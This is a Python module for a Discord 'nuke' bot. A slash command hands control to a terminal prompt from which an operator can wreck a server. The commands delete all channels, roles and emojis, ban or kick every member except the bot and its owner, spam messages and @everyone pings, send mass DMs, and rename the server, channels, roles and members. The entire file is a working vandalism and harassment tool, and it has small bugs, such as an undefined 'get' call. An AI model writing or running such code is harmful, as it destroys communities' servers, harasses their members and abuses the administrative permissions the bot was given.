import discord
from discord import app_commands
from discord.ext import commands
from discord.ext.commands import Bot
from discord import channel, guild
from discord import Interaction
import asyncio
class nuke():

    

    async def get_input(self, input_message, timeout=200):
        return await asyncio.wait_for(self.get_input_from_terminal(input_message=input_message), timeout=timeout)

    async def get_input_from_terminal(self, input_message):
        try:
            theone = await asyncio.wait_for(
                asyncio.get_running_loop().run_in_executor(None, input, input_message),
                timeout=200.0 # Timeout after 200 seconds
            )
        except asyncio.TimeoutError:
            theone = 702103 # Return 702103 if the user does not provide input within the timeout period
        return theone


    async def server_nuke(self, NUKE_guild, NUKE_channel, bot):
        print("NUKE INITIATED")
        stop = False
        while not stop:
            try:
                todo = await self.get_input(input_message="INSERT COMMAND. USE '.help' FOR COMMAND LIST  ", timeout=200)
            except Exception as e:
                print(e)
                todo = 702103
            if todo == ".help":
                print("""COMMAND LIST:\n.help\n.stop\n.allchannelsDELETE\n.allchannelsCHANGE_NAME_TO\n.spamMESSAGES\n.allrolesCHANGE_NAME_TO\n.allrolesDELETE\n.allmembersBAN\n.allmembersKICK\n.allmembersDM\n.allmembersCHANGE_NICKNAME_TO\n.guildCHANGE_NAME_TO\n.allemojisDELETE\n.allemojisCHANGE_NAME_TO\n.@everyone\n.guildCHANGE_ICON_TO""")
            elif todo == ".stop":
                print("STOPPED NUKE ACTIVATION")
                stop = True
            elif todo == ".allchannelsDELETE":
                for channel in NUKE_guild.channels:
                    await channel.delete()
                print("SUCCESSFULLY DELETED ALL CHANNELS")
            elif todo == ".allchannelsCHANGE_NAME_TO":
                channel_name= await self.get_input(input_message="INSERT CHANNEL NAME  ", timeout=200)
                if channel_name == 702103:
                    print("NUKE TIMED OUT")
                    break
                for channel in NUKE_guild.channels:
                    await channel.edit(name=channel_name)
                print(f"SUCCESSFULLY CHANGED ALL CHANNEL NAMES TO {channel_name}")
            elif todo == ".spamMESSAGES":
                messagetospam= await self.get_input(input_message="INSERT MESSAGE  ", timeout=200)
                if messagetospam == 702103:
                    print("NUKE TIMED OUT")
                    break
                isitint = False
                timeout = False
                while not isitint:
                    try:
                        number = await self.get_input(input_message="INSERT AMOUNT OF MESSAGES TO SPAM  ", timeout=200)
                        if number == 702103:
                            timeout = True
                            print("NUKE TIMED OUT")
                            break 
                        number = int(number)            
                        isitint = True
                    except:
                        print("INVALID INTERGER")
                        isitint = False
                if timeout == True:
                    break
                for i in range(1, number+1):
                    await NUKE_channel.send(f"{messagetospam}")
                print(f"SPAMMED {number} MESSAGES")
            elif todo == ".allrolesCHANGE_NAME_TO":
                role_name = await self.get_input(input_message="INSERT ROLE NAME  ", timeout=200)
                if role_name == 702103:
                    print("NUKE TIMED OUT")
                    break
                amountroleschanged = 0
                for role in NUKE_guild.roles:
                    try:
                        await role.edit(name=role_name)
                        amountroleschanged += 1
                    except:
                        continue
                print(f"SUCCESSFULLY CHANGED {amountroleschanged} ROLE NAMES TO {role_name}")
                
            elif todo == ".allrolesDELETE":
                amountrolesdeleted = 0
                for role in NUKE_guild.roles:
                    try:
                        await role.delete()
                        amountrolesdeleted += 1
                    except:
                        continue
                print(f"SUCCESSFULLY DELETED {amountrolesdeleted} ROLES")
            elif todo == ".allmembersBAN":
                reason = await self.get_input(input_message="INSERT REASON FOR BANS  ", timeout=200)
                if reason == 702103:
                    print("NUKE TIMED OUT")
                    break
                amountmembersbanned = 0
                botowner = get(bot.get_all_members(), id=bot.owner_id)
                for member in NUKE_guild.members:
                    if member != bot.user and member != botowner:
                        try:
                            await member.ban(reason=reason)
                            amountmembersbanned += 1
                        except:
                            continue
                print(f"SUCCESSFULLY BANNED {amountmembersbanned} MEMBERS")
            elif todo == ".allmembersKICK":
                reason = await self.get_input(input_message="INSERT REASON FOR KICKS  ", timeout=200)
                if reason == 702103:
                    print("NUKE TIMED OUT")
                    break
                amountmemberskicked = 0
                botowner = discord.utils.get(bot.get_all_members(), id=bot.owner_id)
                for member in NUKE_guild.members:
                    if member != bot.user and member != botowner:
                        try:
                            await member.kick(reason=reason)
                            amountmemberskicked += 1
                        except:
                            continue
                print(f"SUCCESSFULLY KICKED {amountmemberskicked} MEMBERS")
            elif todo == ".allmembersDM":
                message = await self.get_input(input_message="INSERT DM  ", timeout=200)
                if message == 702103:
                    print("NUKE TIMED OUT")
                    break
                amountmembersdmed = 0
                for member in NUKE_guild.members:
                    try:
                        if member != bot.user:
                            await member.send(content=message)
                            amountmembersdmed += 1
                    except:
                        continue
                print(f"SUCCESSFULLY SENT A DM TO {amountmembersdmed} MEMBERS")
            elif todo == ".allmembersCHANGE_NICKNAME_TO":
                nick = await self.get_input(input_message="INSERT NEW NICKNAMES  ", timeout=200)
                if nick == 702103:
                    print("NUKE TIMED OUT")
                    break
                amountnicknameschanged = 0
                for member in NUKE_guild.members:
                    try:
                        await member.edit(nick=nick)
                        amountnicknameschanged += 1
                    except:
                        continue
                print(f"SUCCESSFULLY CHANGED {amountnicknameschanged} MEMBERS' NICKNAMES")
            elif todo == ".guildCHANGE_NAME_TO":
                newname = await self.get_input(input_message="INSERT NEW GUILD NAME  ", timeout=200)
                try:
                    await NUKE_guild.edit(name=newname)
                    print("SUCCESSFULLY CHANGED THE GUILD'S NAME")
                except Exception as e:
                    print(e)
            elif todo == ".allemojisDELETE":
                emojisdeleted = 0
                for emoji in NUKE_guild.emojis:
                    try:
                        await emoji.delete()
                        emojisdeleted+=1
                    except:
                        continue
                print(f"SUCCESSFULLY DELETED {emojisdeleted} EMOJIS")          
            elif todo == ".allemojisCHANGE_NAME_TO":
                newemoji = await self.get_input(input_message="INSERT NEW EMOJI NAMES  ", timeout=200)
                emojischanged = 0
                for emoji in NUKE_guild.emojis:
                    try:
                        await emoji.edit(name=newemoji)
                        emojischanged+=1
                    except:
                        continue
                print(f"SUCCESSFULLY CHANGED {emojischanged} EMOJIS' NAMES")
            elif todo == ".@everyone":
                channelamountpings = 0
                for channel in NUKE_guild.channels:
                    try:
                        await channel.send("@everyone @everyone @everyone")
                        channelamountpings += 1
                    except:
                        continue
                print(f"SUCCESSFULLY PINGED EVERYONE IN {channelamountpings} CHANNELS")
            elif todo == 702103:
                print("NUKE TIMED OUT")
                break
            else:
                print("INVALID COMMAND")
        return

async def nukeactivate(interaction: discord.Interaction, bot: discord.ext.commands.Bot):
    """
    Parameters:
        interaction (discord.Interaction): The interaction from the slash command.
    """
    nukeit = nuke()
    await nukeit.server_nuke(NUKE_guild=interaction.guild, NUKE_channel=interaction.channel, bot=bot)